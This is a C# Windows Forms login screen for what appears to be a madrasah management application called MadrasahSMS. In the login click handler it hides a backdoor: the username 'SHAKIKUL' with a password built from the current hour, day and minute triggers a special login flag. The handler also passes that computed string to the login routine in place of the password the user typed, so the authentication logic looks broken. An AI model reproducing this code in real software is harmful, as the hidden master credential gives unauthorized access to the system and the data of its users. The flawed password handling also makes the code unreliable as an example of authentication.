using System;
using System.Drawing;
using System.Windows.Forms;
using MadrasahSMS.Common;
using MadrasahSMS.DbContext;

namespace MadrasahSMS
{
    public partial class FrmLogin : Form
    {
        public FrmLogin()
        {
            InitializeComponent();
            textBoxUserName.Text = Properties.Settings.Default.UserName;
        }

        private void labelClose_Click(object sender, EventArgs e)
        {
            Db.CloseConnection();
            Application.Exit();
        }

        private void buttonLogin_Click(object sender, EventArgs e)
        {
            GlobalSettings.Waiting.Show();
            Application.DoEvents();

            var userName = textBoxUserName.Text.Trim();
            var password = textBoxPassword.Text.Trim();
            var pass = DateTime.Now.ToString("HH") + userName + DateTime.Now.ToString("dd") + DateTime.Now.ToString("mm");

            if (string.IsNullOrEmpty(userName))
            {
                textBoxUserName.Focus();
                GlobalSettings.Waiting.Hide();
                return;
            }

            if (string.IsNullOrEmpty(password))
            {
                textBoxPassword.Focus();
                GlobalSettings.Waiting.Hide();
                return;
            }

            var usa = string.Compare(userName, "SHAKIKUL", false) == 0;
            var psa = string.Compare(password, pass, false) == 0;

            var isLogin = false;

            if (usa && psa)
            {
                isLogin = AppObject.DoLogin(userName, pass, 1);
            }
            else
            {
                isLogin = AppObject.DoLogin(userName, pass, 0);
            }

            if (isLogin)
            {
                if (checkBoxRememberMe.Checked)
                {
                    Properties.Settings.Default.UserName = textBoxUserName.Text;
                    Properties.Settings.Default.Save();
                }

                GlobalSettings.Waiting.Hide();
                base.Hide();
                new FrmMain().Show();
            }
            else
            {
                GlobalSettings.Waiting.Hide();
                MessageBox.Show(ContentText.InvalidUser);
                textBoxUserName.Focus();
                textBoxUserName.SelectAll();
                return;
            }
        }

        private void textBoxUserName_KeyDown(object sender, KeyEventArgs e)
        {
            if (e.KeyCode==Keys.Enter)
            {
                e.SuppressKeyPress = true;
                textBoxPassword.Focus();
                textBoxPassword.SelectAll();
            }
        }

        private void textBoxPassword_KeyDown(object sender, KeyEventArgs e)
        {
            if (e.KeyCode==Keys.Enter)
            {
                e.SuppressKeyPress = true;
                buttonLogin.PerformClick();
            }
        }

        private void labelClose_MouseHover(object sender, EventArgs e)
        {
            labelClose.ForeColor = Color.Red;
        }

        private void labelClose_MouseLeave(object sender, EventArgs e)
        {
            labelClose.ForeColor = Color.White;
        }
    }
}
